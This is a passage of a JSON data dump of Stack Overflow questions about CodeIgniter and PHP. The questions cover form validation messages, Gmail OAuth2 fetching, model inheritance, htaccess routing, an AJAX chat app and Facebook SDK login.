            echo $expense['commentaire'];\n                                      echo '&lt;/br&gt;';\n                                        }\n                              }\n                              else\n                              {\n                                echo 'Vous n\\'avez pas eu de depenses pour cette date';\n                              }\n            ?&gt;\n       &lt;/div&gt;\n</code></pre>\n\n<p>This does not show anything on the browser. \nI can't use the method of sending data by loading the view in getAllExpense because I already load it in the function index.\nCould anyone help me please?</p>\n"},{"tags":["php","javascript","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":49,"score":0,"question_id":12693599,"title":"How can I show codeigniter form validation messages in an alertbox","body":"<p>I am trying to adapt Ion auth to work with ajax, because my login form is a fixed size, i want to alert the error messages when a form is submitted with incorrect data.</p>\n\n<p>The messages are returned from the controller like this:</p>\n\n<pre><code>$this-&gt;session-&gt;set_flashdata('message', $this-&gt;ion_auth-&gt;messages());\n</code></pre>\n\n<p>and picked up in the view like this:</p>\n\n<pre><code>&lt;div id=\"infoMessage\"&gt;&lt;?php echo $message;?&gt;&lt;/div&gt;\n</code></pre>\n\n<p>I am trying to display them as follows:</p>\n\n<pre><code>&lt;?php   if((isset($message))&amp;&amp;($message!='')){\n            echo '&lt;script&gt; alert(\"'.$message.'\"); &lt;/script&gt;';\n        }\n?&gt;\n</code></pre>\n\n<p>This isn't working, the alert is not being displayed, I have removed the message delimiters but this didn't help. My only thought is it must be something to do with the way codeigniter is creating a new line in the middle of my javascript as it is coming out like this:</p>\n\n<pre><code>&lt;script&gt;\nalert('The Identity field is required.\nThe Password field is required.');\n&lt;/script&gt;\n</code></pre>\n\n<p>How can I get rid of this newline and replace it in a way that wont break my js?</p>\n"},{"tags":["php","codeigniter","gmail","google-api","oauth-2.0"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":81,"score":1,"question_id":12694235,"title":"Fetch emails from Gmail via OAuth2","body":"<p>I'm trying to fetch emails from gmail using PHP and CodeIgniter, and an OAuth2 library. I have already got OAuth2 set up to get the users access token, etc. I can get the users info by doing </p>\n\n<pre><code>public function get_user_info(OAuth2_Token_Access $token)\n{\n    $url = 'https://www.googleapis.com/oauth2/v1/userinfo?alt=json&amp;'.http_build_query(array(\n        'access_token' =&gt; $token-&gt;access_token,\n    ));\n\n    $user = json_decode(file_get_contents($url), true);\n    return array(\n        'uid' =&gt; $user['id'],\n        'nickname' =&gt; url_title($user['name'], '_', true),\n        'name' =&gt; $user['name'],\n        'first_name' =&gt; $user['given_name'],\n        'last_name' =&gt; $user['family_name'],\n        'email' =&gt; $user['email'],\n        'location' =&gt; null,\n        'image' =&gt; (isset($user['picture'])) ? $user['picture'] : null,\n        'description' =&gt; null,\n        'urls' =&gt; array(),\n    );\n}\n</code></pre>\n\n<p>What I want to do now is fetch some emails. I've googled for some code on how to get emails but the only thing I can see is <code>https://mail.google.com/mail/feed/atom/</code>. I found this on the Google OAuth2 Playground but I can't figure out how to use it apart from navigating to it directly.</p>\n\n<p>Can anyone give me some suggestions? Ideally I want to fetch emails that are not just new (this seems to be what the link above does).</p>\n"},{"tags":["php","codeigniter"],"answer_count":3,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":61,"score":0,"question_id":12678862,"title":"Codeigniter Modify POST","body":"<p>I use one view for adding/editing DB data:</p>\n\n<pre><code>&lt;input name=\"blah\" id=\"blah\" value=\"&lt;? set_selected('blah')?&gt; /&gt;\n</code></pre>\n\n<p>In my controller for edit I do this:</p>\n\n<pre><code>$_POST['blah'] = 'DB value';\n$this-&gt;load-&gt;view('...');\n</code></pre>\n\n<p>But the input field is blank. I want the inputs to be prepopulated for my edit case.</p>\n"},{"tags":["php","codeigniter","video","file-upload"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":121,"score":0,"question_id":10757366,"title":"Issue uploading some mp4 with codeigniter","body":"<p>I have a website where users can upload videos. I have been having an issue with some mp4 not uploading. Specifically ones coming from Android phones. I can get most mp4 upload just fine but the ones form that device are encode in some way that is rejecting them.</p>\n\n<p>Anyone know why this is or a fix for it?</p>\n"},{"tags":["iphone","ios","codeigniter","website"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":107,"score":0,"question_id":12267042,"title":"iPhone/iPad says 'Download Failed' when trying to load website","body":"<p>I have a weird issue. Whenever I do something like login it will create the session, but then say 'Download Failed Safari cannot download this file' and doesn't redirect. If I go the the actual page that it should have redirected me to I am logged in. The same things happens any time you do anything such as logout, upload content, etc.</p>\n\n<p>It only happens on iOS devices in Safari on 3G. Wifi it works just fine. Chrome on the iPhone works fine on 3G. Obviously its like its trying to download something, but I can't seem to figure out why this is, or why it is.</p>\n\n<p>It happens when I am login in to my profile, but if that profile is public and I just go directly to that page without logging in there is not issue. Make sense?.....</p>\n\n<p>The site is built in Codeigniter. If any one has ANY sort of idea that would be great!!!</p>\n"},{"tags":["codeigniter"],"answer_count":2,"favorite_count":2,"up_vote_count":0,"down_vote_count":0,"view_count":255,"score":0,"question_id":7430287,"title":"IONIZE CMS post installation problem","body":"<p>I decided to try Ionize cms which is build over CodeIgnitor. I have my apache, php , mysql installed seperately. When I finished installing the cms successfully, I cannot access the website. Some weird errors occurs like </p>\n\n<pre><code>Call to a member function num_rows() on a non-object in ... \\ionize-0.9\\application\\models\\article_model.php on line 224\n</code></pre>\n\n<p>I got frustated and searched many places. Later I tested the CMS in WAMP, and there it worked.</p>\n\n<p>Now I have no idea, what is going on, everything the CMS needs to run, is tested during the installation. I dont have any idea.... how to solve it. Please help me</p>\n"},{"tags":["php","mvc","codeigniter","crud"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":81,"score":1,"question_id":12689753,"title":"CodeIgniter & MVC, where should the image uploading logic be?","body":"<p>I'm developing a simple app with a CRUD admin panel, using CodeIgniter. One of my models has 5 optional images, so when I create a new register, the app should check the amount of images the user has input, upload and store them properly.</p>\n\n<p>Currently, the code that handles the uploading and the storage is in my controller. However, I've been reading a lot about MVC and some say that the controller should be as <em>skinny</em> as possible, so I'm wondering if it'd be a good idea to move that code to the model.</p>\n\n<p>What do you think?</p>\n"},{"tags":["php","mvc","codeigniter","model"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":822,"score":0,"question_id":8112284,"title":"Extending Models in CodeIgniter","body":"<p>I'm receiving this error for some odd reason:</p>\n\n<pre><code>Fatal error: Class 'crud_model' not found in /application/models/shared_model.php on line 3\n</code></pre>\n\n<p>From this line:</p>\n\n<pre><code>class Shared_model extends crud_model {\n</code></pre>\n\n<p>Which has worked before in the past. Does anyone know what may be occuring here? The file is the respective folder, it's spelled correctly, and I've event tried the following with no positive results.</p>\n\n<pre><code>class Shared_model extends Crud_model {\n</code></pre>\n\n<p>and</p>\n\n<pre><code>class Shared_model extends Crud_Model {\n</code></pre>\n\n<p>Here is crud_model.php</p>\n\n<pre><code>&lt;?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');\n\nclass Crud_model extends CI_Model {\n\npublic $table_name;\npublic $pk;\n\npublic function __construct()\n{\n    parent::__construct();\n}\n</code></pre>\n\n<p>Here is shared_model.php</p>\n\n<pre><code>&lt;?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');\n\nclass Shared_model extends Crud_model {\n\npublic function __construct()\n{\n    parent::__construct();\n\n    $this-&gt;pk = 'id';\n    $this-&gt;table_name = 'shares';\n}\n</code></pre>\n"},{"tags":["codeigniter","plugins","graph"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":1,"view_count":322,"score":0,"question_id":8812687,"title":"CodeIgniter Graph Making Plugin/Library?","body":"<p>Do you know of an easy to use graph/chart making plugin/library for CodeIgniter? Thanks!</p>\n"},{"tags":["javascript","mysql","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":73,"score":0,"question_id":12669940,"title":"can't send data from controller to view in a codeIgniter project","body":"<p>I'm trying to send data from my controller to the view. Here is how I do:\nIn the controller: </p>\n\n<pre><code>function getAllProjects() \n    {\n      $where= array('id_user'=&gt;$this-&gt;session-&gt;userdata('id_user'));\n      $result=$this-&gt;expenses_model-&gt;get_all('projets', $where);//get_all returns an array\n      echo json_encode ($result);\n      return $result;\n    }\n\nfunction index (){\n                       $data['all_projects']= $this-&gt;getAllProjects();\n                       $this-&gt;session-&gt;set_userdata('id_user', 28);\n                       $this-&gt;load-&gt;view('layout/public/header');\n                       $this-&gt;load-&gt;view('content/public/profil/modules/expenses',$data);\n                       $this-&gt;load-&gt;view('layout/public/footer');\n                     }\n</code></pre>\n\n<p>echo json_encode $data  returns a correct result) in the controller but I don't know how to do to display it in the view. I tried:(in the view)</p>\n\n<pre><code>&lt;label&gt;&lt;strong&gt;Sur le projet&lt;/strong&gt;&lt;/label&gt;\n       &lt;select class=\"span4\" id=\"projet\" name=\"projet\"&gt;\n    &lt;?php \n        if (isset($all_projects) &amp;&amp; ! empty($all_projects))\n            {  echo \"there is some projects\"; //is not printed\n            foreach ($all_projects as $project){\n            echo  \"&lt;option value=\".$project['id_projet'].\"&gt;\".$project['titre'].\"&lt;/option&gt;\";   }\n           else  {\n                 echo \"&lt;option value='0'&gt;No projects&lt;/option&gt;\";\n                               }\n</code></pre>\n\n<p>But it does not show anything in the drop down list \"projects\"\n What I am doing wrong? Could anyone help me please?</p>\n"},{"tags":["php","apache",".htaccess","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":132,"score":2,"question_id":12682610,"title":"Codeigniter remove index.php while working on virtual host on xampp","body":"<p>My previous folder tree was (with portable xampp): (for example working on D: drive root)</p>\n\n<pre><code>/xampp/htdocs/application\n/xampp/htdocs/system\n/xampp/htdocs/themes\n/xampp/htdocs/index.php etc..\n</code></pre>\n\n<p>Now I am trying to shift into a structure which I can work with multiple projects so new tree:</p>\n\n<pre><code>/xampp/htdocs\n/web_projects/project-name/codeigniter/application\n/web_projects/project-name/codeigniter/system\n/web_projects/project-name/htdocs/themes\n/web_projects/project-name/htdocs/index.php\n</code></pre>\n\n<p>My <strong>htaccess</strong> file in htdocs:</p>\n\n<pre><code>RewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond $1 !^(index\\.php|robots\\.txt)\n\n# if Serves works on Linux OS\nRewriteRule ^(.*)$ index.php/$1\n\n# if Server works on Windows OS\n# RewriteRule ^(.*)$ index.php?/$1\n\nRewriteCond %{REQUEST_FILENAME} !-f\n\n# if Serves works on Linux OS\nRewriteRule ^(application|modules|plugins|system|themes|library|files) index.php/$1 [L]\n\n# if Server works on Windows OS\n# RewriteRule ^(application|modules|plugins|system|themes|library|files) index.php?/$1 [L]\n</code></pre>\n\n<p>And <strong>httpd-vhosts.conf</strong>:</p>\n\n<pre><code>NameVirtualHost *:8080\n\n&lt;VirtualHost *:8080&gt;\n    DocumentRoot \"/xampp/htdocs\"\n    ServerName localhost\n    &lt;Directory \"/xampp/htdocs\"&gt;\n        Order allow,deny\n        Allow from all\n    &lt;/Directory&gt;\n&lt;/VirtualHost&gt;\n\n&lt;VirtualHost *:8080&gt;\n    DocumentRoot \"/web_projects\"\n    ServerName welcome.localhost\n    &lt;Directory \"/web_projects\"&gt;\n        Order allow,deny\n        Allow from all\n    &lt;/Directory&gt;\n&lt;/VirtualHost&gt;\n\n&lt;VirtualHost *:8080&gt;\n    DocumentRoot \"/web_projects/test/htdocs\"\n    ServerName test.localhost\n    &lt;Directory \"/web_projects/test/htdocs\"&gt;\n        Order allow,deny\n        Allow from all\n    &lt;/Directory&gt;\n&lt;/VirtualHost&gt;\n</code></pre>\n\n<p>Finally <strong>etc/host</strong>:</p>\n\n<pre><code>127.0.0.1 localhost\n127.0.0.1 welcome.localhost\n127.0.0.1 test.localhost\n127.0.0.1 vstart # Alias for test\n</code></pre>\n\n<p>All virtual hosts are working, i.e. <strong>http://vstart:8080/</strong> is working but codeigniter not operates without index.php in address line, so routes are not working in accordance.</p>\n\n<p>My <strong>config/config.php</strong> file is:</p>\n\n<pre><code>$config['base_url'] = ((isset($_SERVER['HTTPS']) &amp;&amp; $_SERVER['HTTPS'] == \"on\") ? \"https\" : \"http\");\n$config['base_url'] .= \"://\".$_SERVER['HTTP_HOST'];\n$config['base_url'] .= str_replace(basename($_SERVER['SCRIPT_NAME']),\"\",$_SERVER['SCRIPT_NAME']);\n\n$config['index_page'] = '';\n</code></pre>\n\n<p>This set was working smoothly in my previous folder tree now is not working. I digged internet to find a solution with failure.</p>\n\n<p>Any outer eyes to catch where I am doing wrong?</p>\n"},{"tags":["php","codeigniter","codeigniter-2"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":12685986,"title":"CodeIgniter - Additional dbforge / migration fields","body":"<p>Im having trouble figuring out this migrations business for CodeIgniter ... I cant find any decent documentation that explains additional field elements like current_timestamp, default datetime values etc etc</p>\n\n<p>I was wondering if someone could help me out to translate the following into proper dbforge->add_field  arrays</p>\n\n<p>I need the following 2</p>\n\n<pre><code>`last_login` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP\n</code></pre>\n\n<p>and</p>\n\n<pre><code>`created` datetime NOT NULL DEFAULT '0000-00-00 00:00:00'\n</code></pre>\n\n<p>I have copied these from the SQL insert statement from the tank_auth library.</p>\n\n<p>But i want to put it into migrations now.</p>\n\n<p>Cheers,</p>\n"},{"tags":["php","codeigniter","shopping-cart"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":96,"score":0,"question_id":12684919,"title":"Shopping Cart Framework","body":"<p>I am tasked to build a shopping cart that sells book. I would like to seek help in putting me in the right direction as to where to go from here.</p>\n\n<p>As of what I see, I can do the cart in two ways:</p>\n\n<ul>\n<li>Use CI framework and build the site from scratch.</li>\n<li>Use an existing shopping cart system and build from there.</li>\n</ul>\n\n<p>The problem with doing the CI is its very tedious. You are basically building from scratch. So this will take time and add to the fact that this is my first time building a shopping cart. The second option seems to be ok. Why would I re-invent the wheel so to say. The only problem is finding the right open source cart that is well documented for me to start on.</p>\n\n<p>So based on the two options I have. If you think it is the second option, can you suggest (if you had created a cart before) a shopping cart application that is easy and the code base is similar to CI. I found OpenCart to be ok but I would like to seek other suggestions before I start.</p>\n"},{"tags":["codeigniter","foreach"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":49,"score":1,"question_id":12684011,"title":"accessing array in array data pass from controller to view of codeigniter","body":"<p>I have this following code in my controller. I want to print the data i have my array.. should it be double forloop or foreach?</p>\n\n<p>CONTROLLER:</p>\n\n<pre><code>public function index()\n{\n    $in_cart = array();\n\n    if (!isset($_SESSION['cartProducts'])){\n        $in_cart['list'] = \"No Products\";\n    }\n    else{\n        foreach ($_SESSION['cartProducts'] as $key =&gt; $value) {\n            $in_cart[$key] = $this-&gt;shopmod-&gt;get_one_data($key);\n\n        }\n        $cart['list'] = $in_cart;\n\n    }\n\n\n    $this-&gt;load-&gt;vars($cart);\n    $data['cart'] = $this-&gt;load-&gt;view('shop/cart', '',  TRUE);\n    $this-&gt;load-&gt;view('layout/default', $data);\n}\n</code></pre>\n\n<p>VIEW:</p>\n\n<pre><code>&lt;?php if(is_array($list)): ?&gt;\n        &lt;?php foreach($list as  $row):?&gt;\n            &lt;tr&gt;\n                &lt;td&gt;&lt;?=$row-&gt;name?&gt;&lt;/td&gt;\n            &lt;/tr&gt;\n\n        &lt;?php endforeach ?&gt;\n    &lt;?php endif;?&gt;\n</code></pre>\n\n<p>but i have this following error:\n<strong>A PHP Error was encountered\nSeverity: Notice\nMessage: Trying to get property of non-object\nFilename: shop/cart.php\nLine Number: 18</strong></p>\n\n<p>anyhelp guys? :(</p>\n"},{"tags":["php","jquery","ajax","oop","codeigniter"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":1,"view_count":209,"score":0,"question_id":12683175,"title":"chat app using jquery/ajax/php/oop codeigniter","body":"<p>Hi this question relates to a recent question I had posted that I'm trying to find at least some help with in general that leads to solve the entire problem. \nThe following code is not mine and I had to fix it just to get it working to the extent it is now but the problem the algorithm within _get_chat_messages continues to execute the else condition. This doesn't make sense because there's chat message data in Mysql. I'm trying to make this source code work hoping it will lead me in the right direction with refreshing chat message content automatically without forcing browser client refreshes or redirecting headers.</p>\n\n<p>What's causing _get_chat_messages to execute the else condition disregarding the if condition. The if conditions seems to evaluate to TRUE which doesn't make sense. </p>\n\n<p>Any help much appreciated. Thanks.</p>\n\n<p>//JQUERY/AJAX:</p>\n\n<pre><code>$(document).ready(function() {\n\nsetInterval(function() { get_chat_messages(); } , 2500);\n\n$(\"input#chat_message\").keypress(function(e) {\n    if (e.which == 13) {\n        $(\"a#submit_message\").click();\n        return false;\n    }\n});\n\n$(\"#submit_message\").click(function() {\n    var chat_message_content = $(\"input#chat_message\").val();\n    //this if condition seems to be ignored not sure why?\n    if (chat_message_content == \"\") { return false; }\n\n    $.post(base_url + \"chat/ajax_add_chat_message\", { chat_message_content : chat_message_content, chat_id : chat_id, user_id : user_id }, function(data) {\n\n        if (data.status == 'ok')\n        { \n            var current_content = $(\"div#chat_viewport\").html();\n            $(\"div#chat_viewport\").html(current_content + data.message_content);\n\n        }\n        else\n        {\n            // there was an error do something \n\n        }\n\n    }, \"json\");\n\n    $(\"input#chat_message\").val(\"\");\n\n    return false;\n});\n\n\nfunction get_chat_messages()\n{\n\n    $.post(base_url + \"chat/ajax_get_chat_messages\", { chat_id : chat_id }, function(data) {\n\n        if (data.status == 'ok')\n        {\n            var current_content = $(\"div#chat_viewport\").html();\n\n            $(\"div#chat_viewport\").html(current_content + data.message_content);\n\n        }\n        else\n        {\n            // there was an error do something \n\n        }\n\n    }, \"json\");\n}\n\nget_chat_messages();\n\n  });\n</code></pre>\n\n<p>//CONTROLLER:\n      \n\n<pre><code>   class Chat extends CI_Controller {\n\npublic function __construct()\n{\n    parent:: __construct();\n    $this-&gt;load-&gt;model('chat_model');   \n}\n\npublic function index()\n{\n    /* send in chat id and user id */\n\n    $this-&gt;view_data['chat_id'] = 1;\n\n    // check they are logged in\n    if (! $this-&gt;session-&gt;userdata('logged_in')) {\n        redirect('user/login');\n    }\n\n    $this-&gt;view_data['user_id'] = $this-&gt;session-&gt;userdata('user_id');\n\n    $this-&gt;session-&gt;set_userdata('last_chat_message_id_' .    $this-&gt;view_data['chat_id'], 0);\n\n    $this-&gt;view_data['page_title'] = 'web based chat app :)';\n    $this-&gt;view_data['page_content'] = 'view_chat';\n    $this-&gt;load-&gt;view('view_main', $this-&gt;view_data);   \n}\n\n\npublic function ajax_add_chat_message()\n{\n\n    /* Scalar Variable data that needs to be POST'ed to this function\n     * \n     * chat_id\n     * user_id\n     * chat_message_content\n     *       * \n     */\n\n    $chat_id = $this-&gt;input-&gt;post('chat_id');\n    $user_id = $this-&gt;input-&gt;post('user_id');\n    $chat_message_content = $this-&gt;input-&gt;post('chat_message', TRUE);\n\n    $this-&gt;chat_model-&gt;add_chat_message($chat_id, $user_id,   $chat_message_content);\n\n    // grab and return all messages\n    $this-&gt;ajax_get_chat_messages($chat_id);\n}\n\npublic function ajax_get_chat_messages($chat_id)\n{\n    $chat_id = $this-&gt;input-&gt;post('chat_id');\n\n    echo $this-&gt;_get_chat_messages($chat_id);\n}\n\nprivate function _get_chat_messages($chat_id)\n{\n    $last_chat_message_id = (int)$this-&gt;session-&gt;userdata('last_chat_message_id_' . $chat_id); \n\n    $chat_messages = $this-&gt;chat_model-&gt;get_chat_messages($chat_id, $last_chat_message_id);\n\n    if ($chat_messages-&gt;num_rows() &gt; 0)\n    {\n        // store the last chat message id\n        $last_chat_message_id = $chat_messages-&gt;row($chat_messages-&gt;num_rows() - 1)-&gt;chat_message_id;\n\n        $this-&gt;session-&gt;set_userdata('last_chat_message_id_' . $chat_id, $last_chat_message_id);\n\n        // we have some chat let's return it\n\n        $chat_messages_html = '&lt;ul&gt;';\n\n        foreach ($chat_messages-&gt;result() as $chat_message)\n        {\n            $li_class = ($this-&gt;session-&gt;userdata('user_id') == $chat_message-&gt;user_id) ? 'class=\"by_current_user\"' : '';\n\n            $chat_messages_html .= '&lt;li ' . $li_class . '&gt;' . '&lt;span class=\"chat_message_header\"&gt;' . $chat_message-&gt;chat_message_timestamp . ' by ' . $chat_message-&gt;name . '&lt;/span&gt;&lt;p class=\"message_content\"&gt;' .  $chat_message-&gt;chat_message_content . '&lt;/p&gt;&lt;/li&gt;';\n        }\n\n        $chat_messages_html .= '&lt;/ul&gt;';\n\n    $result = array('status' =&gt; 'ok', 'content' =&gt;    $chat_messages_html);\n        //header('Content-Type: application/json',true);\n        return json_encode($result);\n        exit();\n    }\n    else\n    {\n        // we have no chat yet\n        $result = array('status' =&gt; 'no chat', 'content' =&gt; '');\n        //header('Content-Type: application/json',true);\n        return json_encode($result);\n        exit();\n    }\n }\n\n  }\n</code></pre>\n\n<p>//MODEL:\n        \n\n<pre><code>    class chat_model extends CI_Model {\n\npublic function __construct()\n{\n    parent::__construct();\n}\n\npublic function add_chat_message($chat_id, $user_id, $chat_message_content)\n{\n    $query_str = \"INSERT INTO chat_messages (chat_id, user_id,  chat_message_content) VALUES (?, ?, ?)\";\n\n    $this-&gt;db-&gt;query($query_str, array($chat_id, $user_id, $chat_message_content));\n}\n\npublic function get_chat_messages($chat_id, $last_chat_message_id = 0)\n{\n    $query_str = \"SELECT\n                cm.chat_message_id,\n                cm.user_id,\n                cm.chat_message_content,\n                DATE_FORMAT(cm.create_date, '%D of %M %Y at %H:%i:%s') AS chat_message_timestamp,\n                u.name\n                FROM chat_messages cm\n                JOIN users u ON cm.user_id = u.user_id\n                WHERE cm.chat_id = ?\n                and cm.chat_message_id &gt; ?\n                ORDER BY cm.chat_message_id ASC\";\n\n    $result = $this-&gt;db-&gt;query($query_str, array($chat_id, $last_chat_message_id));\n\n    return $result;\n}\n} \n</code></pre>\n\n<p>//VIEW FILE HENCE VIEW_CHAT.PHP   </p>\n\n<pre><code>    &lt;html&gt;\n    &lt;head&gt;\n    &lt;script type=\"text/javascript\" src=\"/js/jquery-1.4.2.min.js\"&gt;&lt;/script&gt;\n    &lt;script type=\"text/javascript\" src=\"&lt;?php echo base_url() . 'public/';?&gt;chat.js\"&gt;   \n    &lt;/script&gt;\n    &lt;script type=\"text/javascript\"&gt;\n\n    var base_url = \"&lt;?php echo base_url();?&gt;\";\n\n    var chat_id = \"&lt;?php echo $chat_id; ?&gt;\";\n    var user_id = \"&lt;?php echo $user_id; ?&gt;\";\n\n    &lt;/script&gt;\n    &lt;/head&gt;\n    &lt;body&gt;\n\n     &lt;style type=\"text/css\"&gt;\n\n     div#chat_viewport {\n font-family:Verdana, Arial, sans-serif;\n padding:5px;\n border-top:2px dashed #585858;\n min-height:300px;\n color:black;\n max-height:650px;\n overflow:auto;\n margin-bottom:10px;\n width:750px;\n}\n\n    div#chat_viewport ul {\nlist-style-type:none;\npadding-left:10px;\n  }\n\n    div#chat_viewport ul li {\nmargin-top:10px;\nwidth:85%;\n  }\n\n    span.chat_message_header {\nfont-size:0.7em;\nfont-family:\"MS Trebuchet\", Arial, sans-serif;\ncolor:#547980;\n }\n\n    p.message_content {\nmargin-top:0px;\nmargin-bottom:5px;\npadding-left:10px;\nmargin-right:0px;\n}\n\n    input#chat_message {\nmargin-top:5px;\nborder:1px solid #585858;\nwidth:70%;\nfont-size:1.2em;\nmargin-right:10px;\n  }\n\n   input#submit_message {\nfont-size:2em;\npadding:5px 10px;\nvertical-align:top;\nmargin-top:5px;\n }\n\n    div#chat_input { margin-bottom:10px; }\n\n    div#chat_viewport ul li.by_current_user span.chat_message_header {\ncolor:#e9561b;\n}\n\n   &lt;/style&gt;\n\n\n  &lt;h1&gt;Let's do some chatting :D&lt;/h1&gt;\n\n  &lt;div id=\"chat_viewport\"&gt;\n\n  &lt;/div&gt;\n\n  &lt;div id=\"chat_input\"&gt;\n  &lt;?php echo form_open('chat/ajax_add_chat_message'); ?&gt;\n  &lt;input id=\"chat_message\" name=\"chat_message\" type=\"text\" value=\"\" tabindex=\"1\" /&gt;\n  &lt;?php echo form_submit('submit_message','submit_message'); ?&gt;\n  &lt;?php echo anchor('#', 'Say it', array('title' =&gt; 'Send this chat message', 'id' =&gt; 'submit_message'));?&gt;\n&lt;div class=\"clearer\"&gt;&lt;/div&gt;\n  &lt;?php echo form_close(); ?&gt;\n  &lt;/div&gt;\n  &lt;/body&gt;\n  &lt;/html&gt;\n</code></pre>\n"},{"tags":["codeigniter","codeigniter-2"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":87,"score":1,"question_id":12683205,"title":"How to disable direct access to callback functions?","body":"<pre><code>&lt;? if ( ! defined('BASEPATH')) exit();\n\n    class Registration extends CI_Controller {\n\n        public function __construct() {\n            parent::__construct();\n            $this-&gt;load-&gt;model('registration_model');\n        }\n\n        public function index() {\n            $this-&gt;load-&gt;library('form_validation');\n\n            $this-&gt;form_validation-&gt;set_rules('email', 'E-mail', 'trim|required|valid_email|callback_email_available');\n\n            if($this-&gt;form_validation-&gt;run() == FALSE) {\n                $this-&gt;load-&gt;view('registration');\n            } else {\n                $this-&gt;registration_model-&gt;add_user();\n            }\n        }\n\n        # Check E-mail\n        public function email_available($email) {\n            $this-&gt;db-&gt;select('email');\n            $this-&gt;db-&gt;where('email', $email);\n            $query = $this-&gt;db-&gt;get('users');\n            $result = $query-&gt;row();\n\n            if(!empty($result)) {\n                $this-&gt;form_validation-&gt;set_message('email_available', 'This e-mail belongs to another user.');\n                return FALSE;\n            } else {\n                return TRUE;\n            }\n        }\n\n    }\n    ?&gt;\n</code></pre>\n\n<p>I have a registration form with Form Validation.\nAnd I have a callback function to validate email uniqueness.</p>\n\n<p>All code works fine, but I can directly access to callback function with errors</p>\n\n<p>examle.com/registration/email_available</p>\n\n<pre><code>A PHP Error was encountered\nSeverity: Warning\nMessage: Missing argument 1 for Registration::email_available()\nFilename: controllers/registration.php\n\nA PHP Error was encountered\nSeverity: Notice\nMessage: Undefined variable: email\nFilename: controllers/registration.php\n</code></pre>\n\n<p>How can I deny direct access to callback function?</p>\n"},{"tags":["php","mvc","codeigniter","model","codeigniter-2"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":89,"score":0,"question_id":12682240,"title":"CodeIgniter, multiple queries in same model method or multiple calls to model in controller?","body":"<p>I'm just starting to convert some basic applications to CodeIgniter and I'm trying to make sure that I start off on the right footing.</p>\n\n<p>Most actions in my controller require at least 1 query and as I see it there are 2 ways to go about this...  </p>\n\n<ol>\n<li><p>Combine the queries into a single method in the model, therefore making only a single call to the model from the controller.</p></li>\n<li><p>Have each query be its own method in the model, then call each method in turn from the controller.</p></li>\n</ol>\n\n<p>So far I've adopted my own policy but I'm not sure if it's advised or breaking the MVC pattern.</p>\n\n<p>If the queries are directly related to one another and only ever run together in sequence (the 2nd query is dependent on the 1st running successful), <strong>or</strong> data from the 1st query is passed to a 2nd query and it's the 2nd query that returns the actual display result set, then I go with <strong>#1</strong></p>\n\n<p>If each of the queries is returning its own individual result set for display, then I go with <strong>#2</strong></p>\n\n<p>Is there a recommended way to structure and separate the logic in this scenario?<br>\nThe last thing I want to do is cause myself a nightmare later down the line. My gut instinct is telling me that as much of the logic should be in the controller as possible.</p>\n"},{"tags":["codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":20,"score":0,"question_id":12682152,"title":"Codeigniter: /foldername/controllername giving 404 on server","body":"<p>Uploading an application that works fine on my wamp server but not on the development server.</p>\n\n<p>I have most of my controllers in folders.\nFor instance \"/profile/login\" is a controller and calling the url \"/profile/login\" correctly calls the index function on the controller when i do it in localhost.</p>\n\n<p>But when I upload to my server it returns the default 404 codeigniter page. The index.php still works though.</p>\n\n<p>I removed the .htaccess file since I thought that might have something to do with it but didn't change anything.</p>\n\n<p>Also I tried changing the <code>$config['uri_protocol']</code> to the different types.</p>\n\n<p>Whats wierd is that while profile/login doesn't work /login/ does. Even though the login controller is located in the profile folder.</p>\n\n<p>I guess I could create custom routes for all controllers but that seems stupid. I could also rework the controllers so they aren't located in folders.</p>\n\n<p>But I have a feeling this is something incredibly stupid I've missed</p>\n"},{"tags":["facebook","codeigniter","facebook-php-sdk"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":172,"score":0,"question_id":12052407,"title":"Facebook PHP SDK + codeigniter + index.php removing = not working","body":"<p>I'm using facebook-php-sdk with my codeigniter application.\nI have a problem with authentication when I'm trying to get rid off index.php from my URL.</p>\n\n<p>My implementation of facebook connect is simple and works fine. (sdk core files are a library, and cofig file with app data) Authentication works great when I'm typing:</p>\n\n<pre><code>myapp.com/index.php/welcome\n</code></pre>\n\n<p>but when I'm trying:</p>\n\n<pre><code>myapp.com/welcome\n</code></pre>\n\n<p>I can click and click and click on login - and page just refreshes.</p>\n\n<p>My Welcome controller:</p>\n\n<pre><code>public function __construct()\n{\n    parent::__construct();\n    // Your own constructor code\n    $CI = &amp; get_instance();\n    $CI-&gt;config-&gt;load(\"facebook\",TRUE);\n    $config = $CI-&gt;config-&gt;item('facebook');\n    $this-&gt;load-&gt;library('facebook', $config);\n}\n\npublic function index()\n{\n    echo CI_VERSION;\n    $user = $this-&gt;facebook-&gt;getUser();\n    if($user) {\n            $user_info = $this-&gt;facebook-&gt;api('/me');\n            echo '&lt;pre&gt;'.htmlspecialchars(print_r($user_info, true)).'&lt;/pre&gt;';\n    } else {\n        echo \"&lt;a href=\\\"{$this-&gt;facebook-&gt;getLoginUrl()}\\\"&gt;Login using 